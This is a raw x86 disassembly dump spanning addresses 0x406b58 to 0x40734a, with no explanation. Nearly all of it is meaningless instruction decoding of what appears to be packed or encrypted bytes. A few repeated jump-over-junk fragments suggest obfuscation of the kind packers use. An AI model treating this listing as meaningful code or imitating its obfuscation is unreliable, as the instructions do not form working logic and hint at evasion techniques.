  406b58:	mov    ax,WORD PTR [ebp-0x8]
  406b5c:	sbb    DWORD PTR ds:0x43369b,ebx
  406b62:	mov    ecx,0x8a3c
  406b67:	mov    DWORD PTR ds:0x433753,0x29a7
  406b71:	jmp    0x406d50
  406b76:	cwde   
  406b77:	sahf   
  406b78:	inc    edi
  406b79:	mov    bh,0x41
  406b7b:	ja     0x406be5
  406b7d:	mov    cl,0xc9
  406b7f:	mov    DWORD PTR [ecx],0x7cbff05f
  406b85:	fld    QWORD PTR [edx]
  406b87:	cmp    edi,DWORD PTR [esi+0x7e]
  406b8a:	mov    esp,0x297e7e7f
  406b8f:	nop
  406b90:	mov    dl,0x41
  406b92:	test   eax,0x50674018
  406b97:	xchg   ebx,eax
  406b98:	xchg   edx,eax
  406b99:	mov    BYTE PTR [eax+0x6fda2c02],bl
  406b9f:	sub    eax,0x334dc0df
  406ba4:	dec    ebp
  406ba5:	ja     0x406ba8
  406ba7:	pop    es
  406ba8:	(bad)  
  406baa:	pop    ss
  406bab:	cmc    
  406bac:	jl     0x406b62
  406bae:	hlt    
  406baf:	scas   al,BYTE PTR es:[edi]
  406bb0:	or     ecx,esi
  406bb2:	fsub   QWORD PTR [edx]
  406bb4:	push   ss
  406bb5:	jno    0x406b60
  406bb7:	stc    
  406bb8:	mov    eax,0x421ced42
  406bbd:	jecxz  0x406bad
  406bbf:	mov    ah,BYTE PTR [edx+0x68116776]
  406bc5:	ins    DWORD PTR es:[edi],dx
  406bc6:	add    al,0xa6
  406bc8:	shl    cl,cl
  406bca:	xor    al,0xac
  406bcc:	ds in  eax,dx
  406bce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406bcf:	jb     0x406b70
  406bd1:	and    ebp,esi
  406bd3:	stc    
  406bd4:	aaa    
  406bd5:	fstp   DWORD PTR [eax+ebp*1]
  406bd8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406bd9:	mov    DWORD PTR [esi+0x52],eax
  406bdc:	jge    0x406c1a
  406bde:	lahf   
  406bdf:	mov    ds:0xccfa7181,eax
  406be4:	xor    BYTE PTR ds:0x556339d5,al
  406bea:	inc    esi
  406beb:	ins    DWORD PTR es:[edi],dx
  406bec:	in     al,0x2f
  406bee:	add    eax,0x377e8afa
  406bf3:	mov    ch,ah
  406bf5:	jb     0x406b79
  406bf7:	in     eax,0xa2
  406bf9:	cmp    di,WORD PTR [ebx+ecx*8+0x703d4550]
  406c01:	ror    DWORD PTR [edi+0x57],1
  406c04:	ds dec ebx
  406c06:	test   ecx,edx
  406c08:	jns    0x406bb2
  406c0a:	fmul   QWORD PTR [eax]
  406c0c:	and    esi,ecx
  406c0e:	arpl   bp,si
  406c10:	sub    DWORD PTR [edi-0x41544fd8],esp
  406c16:	cmp    eax,0x1db87133
  406c1b:	pop    esp
  406c1c:	fwait
  406c1d:	push   edi
  406c1e:	call   0x77c92407
  406c23:	cmp    BYTE PTR [ebx+edi*2+0x3087bf73],0x4d
  406c2b:	sub    ch,BYTE PTR [esi+edx*2+0x45a05d54]
  406c32:	or     edx,DWORD PTR [ecx+edx*2-0x2cd3c7]
  406c39:	je     0x406c26
  406c3b:	imul   edx,edx,0x69
  406c3e:	push   ebp
  406c3f:	add    ecx,esi
  406c41:	not    ah
  406c43:	xor    eax,DWORD PTR [ecx-0x1259e46f]
  406c49:	int    0x5c
  406c4b:	mov    WORD PTR [edi],es
  406c4d:	mov    edx,0xcc6b8f91
  406c52:	ins    DWORD PTR es:[edi],dx
  406c53:	lods   eax,DWORD PTR ds:[esi]
  406c54:	(bad)  
  406c55:	cli    
  406c56:	sub    eax,0x12d2542f
  406c5b:	jno    0x406c0a
  406c5d:	sbb    ebp,DWORD PTR ss:[ebx+0x66]
  406c61:	sub    eax,0x3d6d4443
  406c66:	(bad)  
  406c67:	lahf   
  406c68:	mov    bl,0x3a
  406c6a:	push   ds
  406c6b:	mov    esi,0xee18a4b0
  406c70:	xchg   DWORD PTR [edi+0x69c6ca76],eax
  406c76:	jno    0x406c3b
  406c78:	xchg   edi,eax
  406c79:	jl     0x406c35
  406c7b:	push   0x31
  406c7d:	sub    DWORD PTR [edx-0x3f],ebp
  406c80:	or     eax,0x4b7351b
  406c85:	les    ebp,FWORD PTR [ebx]
  406c87:	fwait
  406c88:	mov    ebx,0xac6bdaef
  406c8d:	xchg   ecx,eax
  406c8e:	retf   0xceb8
  406c91:	mov    bl,dl
  406c93:	leave  
  406c94:	(bad)  
  406c95:	sbb    edx,DWORD PTR [edx]
  406c97:	hlt    
  406c98:	xor    BYTE PTR [edx],ah
  406c9a:	pop    edi
  406c9b:	sbb    DWORD PTR [eax+0x5c],eax
  406c9e:	add    eax,0x1a8afe1a
  406ca3:	inc    DWORD PTR [ebx-0x265a8a72]
  406ca9:	and    dh,BYTE PTR [edx-0x19]
  406cac:	daa    
  406cad:	fmul   QWORD PTR [edx]
  406caf:	test   BYTE PTR [esp+ecx*8-0x3c],bh
  406cb3:	xchg   ebx,eax
  406cb4:	call   0xaf10:0xd954fc32
  406cbb:	ret    
  406cbc:	push   ecx
  406cbd:	mov    ds:0xb3cefa02,eax
  406cc2:	sub    eax,DWORD PTR [eax+0x22]
  406cc5:	shr    dl,cl
  406cc7:	int3   
  406cc8:	dec    ebp
  406cc9:	sbb    al,0x16
  406ccb:	ins    DWORD PTR es:[edi],dx
  406ccc:	scas   al,BYTE PTR es:[edi]
  406ccd:	push   es
  406cce:	popf   
  406ccf:	pop    edx
  406cd0:	test   ebp,ecx
  406cd2:	xor    al,0x2d
  406cd4:	jg     0x406d12
  406cd6:	push   cs
  406cd7:	fdivr  DWORD PTR [eax]
  406cd9:	and    al,0x7c
  406cdb:	test   BYTE PTR [eax+edi*2-0x6e5a2bf2],0xb3
  406ce3:	leave  
  406ce4:	sub    eax,0xb2bebde
  406ce9:	lea    esp,[edx+edi*1+0x56fc17a4]
  406cf0:	push   esp
  406cf1:	xchg   cl,cl
  406cf3:	push   ds
  406cf4:	(bad)  
  406cf5:	fsub   QWORD PTR [esi]
  406cf7:	loop   0x406d28
  406cf9:	in     eax,0xec
  406cfb:	sbb    eax,0x9038c1d
  406d00:	imul   eax,DWORD PTR [edi+0x2cf1f23f],0xc5158b9
  406d0a:	dec    ecx
  406d0b:	lock sbb bl,BYTE PTR [eax]
  406d0e:	out    dx,eax
  406d0f:	inc    edi
  406d10:	cmp    edi,edx
  406d12:	shl    DWORD PTR [ecx-0x41ab7dd2],cl
  406d18:	ret    
  406d19:	add    esp,DWORD PTR [eax+ebx*1+0x66]
  406d1d:	push   eax
  406d1e:	inc    edx
  406d1f:	data16 xor al,0x62
  406d22:	lds    eax,FWORD PTR [esi]
  406d24:	jne    0x406d14
  406d26:	xor    ch,BYTE PTR [eax-0x270c7cd0]
  406d2c:	nop
  406d2d:	pop    esi
  406d2e:	lahf   
  406d2f:	jo     0x406d65
  406d31:	mov    dl,0x78
  406d33:	xchg   bl,al
  406d35:	jg     0x406d8c
  406d37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d38:	repnz arpl WORD PTR [eax+0x6e64e13c],cx
  406d3f:	xchg   edi,eax
  406d40:	iret   
  406d41:	xor    BYTE PTR [edx+0x27],dh
  406d44:	shl    BYTE PTR [ecx+0x38],1
  406d47:	dec    edx
  406d48:	jns    0x406cfb
  406d4a:	inc    ecx
  406d4b:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406d4d:	sbb    eax,0x3366239f
  406d52:	sar    DWORD PTR [ecx+0x3b02],0x81
  406d59:	sbb    eax,0x4337af
  406d5e:	xchg   ebx,eax
  406d5f:	ss inc ebx
  406d61:	add    BYTE PTR [esi+0x3],ah
  406d64:	rol    DWORD PTR [ecx+0x4337a305],0x0
  406d6b:	push   edi
  406d6c:	jge    0x406d6e
  406d6e:	add    BYTE PTR [ebx-0x48f0f7b3],cl
  406d74:	rol    BYTE PTR [ecx+0x4336e31d],0x0
  406d7b:	(bad)  
  406d7c:	ss inc ebx
  406d7e:	add    cl,ch
  406d80:	fiadd  DWORD PTR [ecx]
  406d82:	add    BYTE PTR [eax],al
  406d84:	cmp    DWORD PTR [ebx],ebp
  406d86:	es fdivrp st(4),st
  406d89:	repz shr DWORD PTR [ecx],0x6c
  406d8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d8e:	pop    esi
  406d8f:	xor    al,0x6b
  406d91:	jle    0x406d86
  406d93:	jb     0x406dd5
  406d95:	cmp    BYTE PTR [esi+0x7e],bh
  406d98:	mov    esp,0xaf7e7e7f
  406d9d:	pop    es
  406d9e:	sub    al,0x8f
  406da0:	ss stos BYTE PTR es:[edi],al
  406da2:	xor    eax,0x68750f46
  406da7:	jnp    0x406da6
  406da9:	dec    esp
  406daa:	rol    bl,0x1b
  406dad:	dec    esi
  406dae:	repnz dec esi
  406db0:	mov    dl,0xca
  406db2:	imul   eax,DWORD PTR [esi-0x80327a],0x24
  406db9:	test   DWORD PTR [eax],ebx
  406dbb:	cmp    al,0xa0
  406dbd:	scas   eax,DWORD PTR es:[edi]
  406dbe:	shl    DWORD PTR [esi+0xf827e23],1
  406dc4:	leave  
  406dc5:	cmc    
  406dc6:	clc    
  406dc7:	loop   0x406db0
  406dc9:	or     bh,ah
  406dcb:	fwait
  406dcc:	loope  0x406d5d
  406dce:	lds    esi,FWORD PTR [ebx-0x4b64d97e]
  406dd4:	(bad)  
  406dd5:	jmp    0xe78d:0x92399e00
  406ddc:	std    
  406ddd:	rol    BYTE PTR [ecx],0xf9
  406de0:	stos   DWORD PTR es:[edi],eax
  406de1:	shl    ebp,cl
  406de3:	(bad)  
  406de5:	dec    esi
  406de6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406de7:	xchg   edi,eax
  406de8:	jle    0x406e46
  406dea:	popa   
  406deb:	mov    ds:0x2eed14c4,al
  406df0:	inc    ebx
  406df1:	(bad)  
  406df2:	lods   al,BYTE PTR ds:[esi]
  406df3:	arpl   WORD PTR [eax],bx
  406df5:	fnsave [edi+ebp*4+0x64]
  406df9:	inc    edi
  406dfa:	not    DWORD PTR [esi+0x7a88577c]
  406e00:	mov    ss,edx
  406e02:	push   cs
  406e03:	out    dx,al
  406e04:	stos   BYTE PTR es:[edi],al
  406e05:	jecxz  0x406e26
  406e07:	arpl   WORD PTR ds:0x9d2449ea,cx
  406e0d:	push   edi
  406e0e:	push   esp
  406e0f:	leave  
  406e10:	mov    edi,0x808481b7
  406e15:	mov    edx,0x5286a488
  406e1a:	mov    ah,BYTE PTR [edx+0x3cc58297]
  406e20:	mov    esi,0xbb4497b7
  406e25:	in     eax,0xa2
  406e27:	jl     0x406e6b
  406e29:	mov    ecx,0x809cb51f
  406e2e:	rcr    BYTE PTR ds:0xbb959b3a,0x18
  406e35:	mov    cl,0xb2
  406e37:	mov    al,ds:0xcc514d1e
  406e3c:	push   ecx
  406e3d:	xor    BYTE PTR [esp+ecx*1],al
  406e40:	enter  0xa8dc,0x7c
  406e44:	je     0x406e94
  406e46:	fcom   QWORD PTR [edi-0x740de38a]
  406e4c:	fistp  WORD PTR [eax+ebp*4+0x3c]
  406e50:	ss sbb ebp,eax
  406e53:	dec    eax
  406e54:	nop
  406e55:	imul   ecx
  406e57:	cmp    BYTE PTR [esi-0x24],0x15
  406e5b:	jl     0x406e84
  406e5d:	sti    
  406e5e:	ja     0x406de1
  406e60:	add    BYTE PTR [ebx-0x207c8ff0],0xc2
  406e67:	push   eax
  406e68:	clc    
  406e69:	fs dec esi
  406e6b:	repnz (bad) 
  406e6d:	test   al,0x1a
  406e6f:	rcl    DWORD PTR [eax],0x5d
  406e72:	jbe    0x406e66
  406e74:	lea    ecx,[esi-0x59]
  406e77:	push   ebx
  406e78:	push   edi
  406e79:	mov    dl,0xaa
  406e7b:	jne    0x406e64
  406e7d:	in     eax,0xd9
  406e7f:	adc    BYTE PTR [edi-0x26],bl
  406e82:	int3   
  406e83:	adc    BYTE PTR [ebx],bh
  406e85:	push   ds
  406e86:	push   esi
  406e87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e88:	lea    ebx,[ebx+0x78]
  406e8b:	pop    ds
  406e8c:	add    DWORD PTR cs:[ecx-0x65b7b2bc],ebp
  406e93:	mov    ds:0x34fb4b76,eax
  406e98:	add    eax,0x199ae9ba
  406e9d:	out    dx,al
  406e9e:	retf   0x2511
  406ea1:	lds    ebp,FWORD PTR [eax+0x321879ba]
  406ea7:	inc    ebp
  406ea8:	ficomp WORD PTR ds:0xe9c8b231
  406eae:	cmp    al,0xca
  406eb0:	mov    al,ds:0xc0f7c85e
  406eb5:	sbb    dh,BYTE PTR [esi]
  406eb7:	imul   esp,esi,0x4c9cdbb0
  406ebd:	and    eax,0xa39d9b15
  406ec2:	add    al,dh
  406ec4:	xor    DWORD PTR [eax],ebp
  406ec6:	sub    eax,0x8558ea45
  406ecb:	inc    esp
  406ecc:	stos   DWORD PTR es:[edi],eax
  406ecd:	and    DWORD PTR ds:0x8f11a453,0x51f85aa8
  406ed7:	sub    BYTE PTR [ebp+0x233d6133],0x7a
  406ede:	mov    esi,0xc18618bd
  406ee3:	dec    edi
  406ee4:	sub    BYTE PTR [esi+0x78],dl
  406ee7:	sub    ecx,DWORD PTR [ebx+0x4ce9af01]
  406eed:	push   ebp
  406eee:	ret    0xe8d0
  406ef1:	fld    QWORD PTR [edi-0x10]
  406ef4:	add    DWORD PTR [esp+ecx*4+0x53b83156],esp
  406efb:	or     ebp,eax
  406efd:	jle    0x406eba
  406eff:	push   eax
  406f00:	jns    0x406eb2
  406f02:	add    ah,cl
  406f04:	sbb    edi,ebp
  406f06:	jl     0x406f23
  406f08:	(bad)
  406f0b:	(bad)  
  406f0c:	pop    esi
  406f0d:	push   0xcd595587
  406f12:	jle    0x406ed1
  406f14:	es dec esp
  406f16:	imul   ebx,DWORD PTR [ebp-0x5],0xffffffa3
  406f1a:	jl     0x406ebd
  406f1c:	stc    
  406f1d:	mov    gs,WORD PTR [ebp+0x8]
  406f20:	and    al,0xca
  406f22:	stos   BYTE PTR es:[edi],al
  406f23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f24:	sub    DWORD PTR [ebx+0x4304829a],edx
  406f2a:	enter  0xc40e,0xc2
  406f2e:	nop
  406f2f:	xor    cl,bl
  406f31:	int3   
  406f32:	ficom  WORD PTR [ebp+0x4b]
  406f35:	push   cs
  406f36:	cmp    eax,0xd579f109
  406f3b:	leave  
  406f3c:	jge    0x406fae
  406f3e:	loop   0x406f96
  406f40:	loope  0x406f25
  406f42:	xchg   ebx,eax
  406f43:	outs   dx,BYTE PTR ds:[esi]
  406f44:	retf   
  406f45:	cmp    ebx,ebp
  406f47:	add    BYTE PTR [edx+0x3906e0ce],ah
  406f4d:	mov    bl,0xe6
  406f4f:	sbb    edx,DWORD PTR [ecx]
  406f51:	retfw  
  406f53:	shr    al,cl
  406f55:	mov    al,ds:0x630de8c1
  406f5a:	adc    eax,0xf7c8f5b0
  406f5f:	rol    BYTE PTR [ecx+0x43368f25],1
  406f65:	add    bl,dl
  406f67:	ss inc ebx
  406f69:	add    BYTE PTR [ebx],ah
  406f6b:	add    DWORD PTR [ebx+0x189084d],ecx
  406f71:	jmp    0x406f7d
  406f76:	xor    DWORD PTR [ebp-0x4],0xe149eb8
  406f7d:	mov    ax,WORD PTR [ebp-0x8]
  406f81:	jmp    0x407160
  406f86:	dec    ebx
  406f87:	rcr    BYTE PTR [ecx],0x72
  406f8a:	mov    cl,0x73
  406f8c:	push   ecx
  406f8d:	loope  0x406f7e
  406f8f:	sahf   
  406f90:	adc    al,BYTE PTR ds:0xbc1a4968
  406f96:	mov    es,esi
  406f98:	jle    0x407018
  406f9a:	mov    esp,0x97e7e7f
  406f9f:	or     eax,0x1c6063c4
  406fa4:	dec    ecx
  406fa5:	pushf  
  406fa6:	icebp  
  406fa7:	mov    bl,0x9f
  406fa9:	jns    0x406f6b
  406fab:	xor    DWORD PTR [esi-0x6b],edx
  406fae:	sbb    al,0x87
  406fb0:	aaa    
  406fb1:	lock lds eax,FWORD PTR [edi+eax*2]
  406fb5:	inc    eax
  406fb6:	jmp    0x774ece73
  406fbb:	push   cs
  406fbc:	jns    0x406f8f
  406fbe:	push   esi
  406fbf:	add    ah,BYTE PTR [ebp-0x3]
  406fc2:	shr    BYTE PTR [ecx-0x61c0f92a],cl
  406fc8:	pop    ebx
  406fc9:	lods   al,BYTE PTR ds:[esi]
  406fca:	neg    DWORD PTR [edx+0xa00e177]
  406fd0:	jge    0x406fb9
  406fd2:	xchg   ebx,eax
  406fd3:	cmp    al,0x44
  406fd5:	adc    BYTE PTR [ecx-0x273812a7],dh
  406fdb:	mov    DWORD PTR [ebx],esi
  406fdd:	into   
  406fde:	push   ss
  406fdf:	(bad)  
  406fe0:	pusha  
  406fe1:	add    DWORD PTR ds:0x7dbe294d,edx
  406fe7:	(bad)  
  406fe8:	sti    
  406fe9:	sbb    eax,DWORD PTR [ebp-0x6cfafa0c]
  406fef:	pop    ds
  406ff0:	or     eax,0xc7e941ca
  406ff5:	icebp  
  406ff6:	adc    al,0x5e
  406ff8:	aad    0xd6
  406ffa:	out    0x94,al
  406ffc:	adc    DWORD PTR ds:0xbe38b30,eax
  407002:	les    edx,FWORD PTR [edx-0x4a]
  407005:	(bad)  
  407006:	je     0x406f8e
  407008:	call   0xd3068d7d
  40700d:	ss jl  0x407049
  407010:	sub    al,0xf
  407012:	add    eax,0x8f2d594e
  407017:	scas   eax,DWORD PTR es:[edi]
  407018:	and    bh,bh
  40701a:	outs   dx,BYTE PTR ds:[esi]
  40701b:	mov    dl,0x18
  40701d:	pop    ebx
  40701e:	outs   dx,DWORD PTR ds:[esi]
  40701f:	dec    ebp
  407020:	and    al,0xfe
  407022:	push   0x9fca5a39
  407027:	cmc    
  407028:	push   ebp
  407029:	outs   dx,DWORD PTR ds:[esi]
  40702a:	sub    ah,BYTE PTR [esi+0x6fab0bbc]
  407030:	scas   eax,DWORD PTR es:[edi]
  407031:	addr16 sub al,0xa4
  407034:	sahf   
  407035:	cwde   
  407036:	(bad)  
  407037:	mov    edi,0x1f69860a
  40703c:	jnp    0x407048
  40703e:	mov    bl,0x91
  407040:	fst    DWORD PTR [eax+0x67]
  407043:	push   edi
  407044:	enter  0xd78b,0x6
  407048:	mov    ds:0x1898d9e8,eax
  40704d:	addr16 dec edi
  40704f:	test   BYTE PTR [ebx],al
  407051:	cmp    cl,BYTE PTR [edi+0x7a43e3b6]
  407057:	xchg   edi,eax
  407058:	frstor [edi+0x459f7218]
  40705e:	enter  0x4a38,0x55
  407062:	adc    DWORD PTR ds:0xa4a645a7,edx
  407068:	sbb    eax,0xb81230b1
  40706d:	loop   0x407056
  40706f:	lods   eax,DWORD PTR ds:[esi]
  407070:	push   cs
  407071:	fs sbb al,0xaf
  407074:	out    0x0,al
  407076:	jns    0x4070d1
  407078:	adc    eax,0x86e58ef6
  40707d:	sbb    esi,DWORD PTR [ebx]
  40707f:	mov    bl,0x6
  407081:	imul   ecx,DWORD PTR [eax-0x326f03ff],0xffffffe0
  407088:	pop    sp
  40708a:	imul   ebp,ebx,0x5
  40708d:	sbb    eax,0x5993e091
  407092:	mov    ah,0x67
  407094:	in     eax,dx
  407095:	dec    esi
  407096:	cs push esp
  407098:	add    BYTE PTR [ecx+0x77fe44f4],ah
  40709e:	sub    bl,dh
  4070a0:	inc    edx
  4070a1:	cli    
  4070a2:	enter  0xa84b,0xc
  4070a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4070a7:	and    BYTE PTR [ecx+0x4ae06aeb],bl
  4070ad:	das    
  4070ae:	stos   BYTE PTR es:[edi],al
  4070af:	leave  
  4070b0:	add    BYTE PTR [edx+edx*4-0x6e],al
  4070b4:	repz mov dh,0x13
  4070b7:	jp     0x40703f
  4070b9:	mov    bl,BYTE PTR [edx]
  4070bb:	jnp    0x4070b6
  4070bd:	mov    ecx,0x17e6534d
  4070c2:	fld    TBYTE PTR [edi]
  4070c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4070c5:	inc    ecx
  4070c6:	jmp    0xc2026a18
  4070cb:	inc    esp
  4070cc:	das    
  4070cd:	xor    ebp,ecx
  4070cf:	ficomp DWORD PTR [eax]
  4070d1:	mov    edi,0x4b709cce
  4070d6:	pop    ss
  4070d7:	mov    bl,0xbb
  4070d9:	and    ecx,DWORD PTR [ecx+0x1c36d1cf]
  4070df:	xlat   BYTE PTR ds:[ebx]
  4070e0:	push   edi
  4070e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4070e2:	test   DWORD PTR ds:0x29debcf5,0x9e0fd56c
  4070ec:	jmp    0x40706f
  4070ee:	jbe    0x407109
  4070f0:	pop    eax
  4070f1:	shr    DWORD PTR [ebp-0x80],0x18
  4070f5:	into   
  4070f6:	lods   al,BYTE PTR ds:[esi]
  4070f7:	int    0x21
  4070f9:	data16 int 0x6a
  4070fc:	in     eax,0xe
  4070fe:	(bad)  
  4070ff:	and    DWORD PTR [edi*4-0x6cf9ff1f],ebx
  407106:	(bad)  
  407107:	das    
  407108:	push   ss
  407109:	mov    DWORD PTR [ecx],esi
  40710b:	loop   0x4070b3
  40710d:	fst    QWORD PTR [esi]
  40710f:	push   edi
  407110:	sub    bl,dl
  407112:	les    ecx,FWORD PTR fs:[ebp-0x5681db7e]
  407119:	out    0x8f,al
  40711b:	fisttp QWORD PTR [esp+edx*1-0x33]
  40711f:	hlt    
  407120:	ja     0x40718e
  407122:	leave  
  407123:	and    ah,bl
  407125:	addr16 or al,0x66
  407128:	mov    eax,ds:0x39b56698
  40712d:	daa    
  40712e:	sahf   
  40712f:	shl    DWORD PTR [ecx],0x80
  407132:	mov    al,0x61
  407134:	dec    ebx
  407135:	cmp    edx,DWORD PTR [eax]
  407137:	or     al,0xf9
  407139:	ins    DWORD PTR es:[edi],dx
  40713a:	mov    ch,al
  40713c:	jg     0x4070ee
  40713e:	xchg   ebx,eax
  40713f:	sub    al,BYTE PTR [eax+0x468ec611]
  407145:	das    
  407146:	dec    edx
  407147:	daa    
  407148:	ins    DWORD PTR es:[edi],dx
  407149:	rcl    BYTE PTR [ebx+0x6f],cl
  40714c:	je     0x40715c
  40714e:	call   0xdad4ab98
  407153:	aad    0x24
  407155:	popf   
  407156:	dec    edi
  407157:	pop    esp
  407158:	sbb    ah,BYTE PTR [edx-0x385a2b19]
  40715e:	add    edi,DWORD PTR [eax-0x17f78a01]
  407164:	jmp    0x407167
  407166:	add    BYTE PTR [eax],al
  407168:	test   eax,eax
  40716a:	jmp    0x407349
  40716f:	and    eax,0xb1edb090
  407174:	in     eax,dx
  407175:	popa   
  407176:	push   eax
  407177:	retf   
  407178:	xchg   BYTE PTR [ebx-0x74],dh
  40717b:	sub    eax,0xccfeb8a6
  407180:	les    edi,FWORD PTR [esi+0x7e]
  407183:	mov    esp,0xee7e7e7f
  407188:	iret   
  407189:	xchg   ecx,eax
  40718a:	jg     0x407144
  40718c:	push   ebp
  40718d:	and    al,0x38
  40718f:	sahf   
  407190:	mov    ebp,0x588ef218
  407195:	push   ebp
  407196:	add    eax,0x31f2ab6d
  40719b:	ds or  ah,bh
  40719e:	and    eax,0xa2bc8c46
  4071a3:	retf   
  4071a4:	add    eax,0x89616d9a
  4071a9:	imul   ecx,ecx,0x15
  4071ac:	jl     0x407171
  4071ae:	in     al,0x8b
  4071b0:	data16 (bad) 
  4071b2:	lahf   
  4071b3:	mov    WORD PTR [edi],ds
  4071b5:	(bad)  
  4071b6:	sbb    DWORD PTR [edi+ecx*2+0x7ab5727b],edx
  4071bd:	jecxz  0x407235
  4071bf:	enter  0xd94,0x69
  4071c3:	test   al,0x1c
  4071c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4071c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4071c7:	and    BYTE PTR [eiz*2+0x7d6b7cac],ah
  4071ce:	clc    
  4071cf:	retf   
  4071d0:	inc    edi
  4071d1:	mov    eax,0x7dfcabc0
  4071d6:	add    edi,DWORD PTR [esi]
  4071d8:	cmp    BYTE PTR [edi-0x1b8753e4],dh
  4071de:	mov    ds:0x630bc7b1,al
  4071e3:	(bad)  
  4071e6:	push   ebx
  4071e7:	cdq    
  4071e8:	mov    bh,0x25
  4071ea:	cwde   
  4071eb:	inc    esp
  4071ec:	cld    
  4071ed:	add    eax,0x47201f19
  4071f2:	jle    0x407204
  4071f4:	test   BYTE PTR ds:0x598c4468,ch
  4071fa:	mov    ebp,0x1ac3c43a
  4071ff:	loope  0x4071eb
  407201:	fcom   DWORD PTR [edi]
  407203:	test   DWORD PTR [eax+0x1ac856b7],0x3ee2c526
  40720d:	enter  0x804f,0x50
  407211:	sub    BYTE PTR [ebp*8+0x3deda3c3],bl
  407218:	lock sahf 
  40721a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40721b:	(bad)  
  40721c:	loope  0x40721f
  40721e:	arpl   WORD PTR [ebp-0x47],bp
  407221:	inc    esi
  407222:	fcos   
  407224:	mov    ecx,DWORD PTR [ebp-0x37]
  407227:	inc    edi
  407228:	sbb    al,0x2b
  40722a:	(bad)  
  40722b:	rcl    al,0x2c
  40722e:	dec    ecx
  40722f:	das    
  407230:	cmp    BYTE PTR ds:0x44ff05f4,ch
  407236:	mov    dl,0x76
  407238:	daa    
  407239:	mov    edx,0xa2e327c2
  40723e:	push   es
  40723f:	pop    ecx
  407240:	enter  0x9e35,0x6a
  407244:	xchg   esp,ebp
  407246:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407247:	sbb    DWORD PTR [esi],0xffffffc2
  40724a:	pop    esi
  40724b:	push   0x3
  40724d:	cli    
  40724e:	sub    DWORD PTR [ecx+0x3abe35d0],edi
  407254:	dec    ebp
  407255:	jl     0x4072b6
  407257:	in     eax,0x1
  407259:	push   ebp
  40725a:	and    DWORD PTR [ecx-0x3dc5a1c2],ebp
  407260:	push   esi
  407261:	ss adc eax,eax
  407264:	fcom   QWORD PTR [eax+0x58210d3]
  40726a:	cld    
  40726b:	dec    edx
  40726c:	sahf   
  40726d:	dec    ecx
  40726e:	sub    esp,DWORD PTR [ecx-0x72db7391]
  407274:	outs   dx,DWORD PTR ds:[esi]
  407275:	into   
  407276:	sbb    BYTE PTR [ebx+esi*4-0x7d6883a3],dl
  40727d:	adc    al,dh
  40727f:	xchg   edx,eax
  407280:	mov    eax,0x34b2bff7
  407285:	sbb    DWORD PTR [ebp+0x5],esp
  407288:	xchg   esp,eax
  407289:	enter  0xa77a,0x8c
  40728d:	mov    WORD PTR [ebp-0x65],?
  407290:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407291:	pop    esi
  407292:	inc    ebp
  407293:	jae    0x40721c
  407295:	push   esi
  407296:	pop    es
  407297:	out    dx,al
  407298:	das    
  407299:	test   DWORD PTR [ecx],esp
  40729b:	dec    eax
  40729c:	inc    esi
  40729d:	mov    WORD PTR [edx-0x7656bca4],gs
  4072a3:	pop    ds
  4072a4:	add    al,0x2e
  4072a6:	and    edx,DWORD PTR [edx+0x782d767d]
  4072ac:	inc    ecx
  4072ad:	pop    esp
  4072ae:	fbstp  TBYTE PTR [edi+edx*4]
  4072b1:	neg    DWORD PTR [ecx-0x78]
  4072b4:	clc    
  4072b5:	xor    al,0x27
  4072b7:	inc    esp
  4072b8:	pop    ebx
  4072b9:	out    dx,eax
  4072ba:	pop    ecx
  4072bb:	adc    edi,DWORD PTR [ebp-0x5b]
  4072be:	xor    ch,BYTE PTR ss:[edi-0x57]
  4072c2:	inc    edx
  4072c3:	push   es
  4072c4:	adc    al,0x33
  4072c6:	in     al,0x26
  4072c8:	push   ds
  4072c9:	pop    ss
  4072ca:	in     eax,dx
  4072cb:	mov    edx,0xadc5fefd
  4072d0:	(bad)  
  4072d1:	push   ebx
  4072d2:	xchg   edi,eax
  4072d3:	push   ecx
  4072d4:	fcomp  DWORD PTR [esp+edi*4]
  4072d7:	clc    
  4072d8:	mov    al,ds:0x77bf1e85
  4072dd:	fidiv  WORD PTR [ebx+eiz*4+0x2211aad8]
  4072e4:	les    edi,FWORD PTR [esi+0x4c]
  4072e7:	cwde   
  4072e8:	sti    
  4072e9:	mov    dl,0x8b
  4072eb:	push   ecx
  4072ec:	int    0x6e
  4072ee:	lds    esp,FWORD PTR [eax+0x2b]
  4072f1:	pop    esi
  4072f2:	inc    ebp
  4072f3:	xchg   ecx,eax
  4072f4:	aaa    
  4072f5:	out    0x3d,al
  4072f7:	imul   di,WORD PTR [ebx-0x686581a],0xdf08
  407300:	sub    eax,0xa581b5ab
  407305:	xor    ebx,DWORD PTR fs:[eax-0x1f5d26d1]
  40730c:	ss mov edi,0x7d471875
  407312:	push   ss
  407313:	fild   DWORD PTR [ecx]
  407315:	popf   
  407316:	js     0x407371
  407318:	fistp  DWORD PTR [eax+eiz*2]
  40731b:	iret   
  40731c:	xor    al,0x38
  40731e:	ds xchg esi,eax
  407320:	xor    eax,0x6c66b4ce
  407325:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407326:	mov    edi,0xf6b12509
  40732b:	sbb    DWORD PTR [eax-0x1a],ebp
  40732e:	call   0x45212c26
  407333:	test   DWORD PTR [edx+eax*4],ecx
  407336:	xor    esi,DWORD PTR [eax]
  407338:	ret    
  407339:	mov    bl,0x9b
  40733b:	xor    al,0x2
  40733d:	xor    esp,DWORD PTR [ebp+0x7b]
  407340:	(bad)  
  407341:	lock jnp 0x407361
  407344:	cmp    esi,ebp
  407346:	add    al,0x96
  407348:	loopne 0x407359
  40734a:	test   BYTE PTR [edi],ah
